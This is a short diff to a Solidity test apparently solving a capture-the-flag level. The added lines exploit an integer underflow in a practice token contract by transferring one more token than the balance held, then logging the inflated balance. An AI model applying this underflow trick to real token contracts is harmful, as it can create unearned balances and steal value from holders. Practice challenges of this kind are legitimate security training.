@@ -58,6 +58,14 @@ contract TokenTest is Test {
         Token instance = Token(payable(instanceAddress));
 
         /* Level Hack */
+        uint256 balance = instance.balanceOf(eoa);
+        emit log_named_uint("balance", balance);
+
+        // 1. Transfer more balance than available to underflow balance
+        instance.transfer(address(0), balance + 1);
+
+        balance = instance.balanceOf(eoa);
+        emit log_named_uint("balance", balance);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
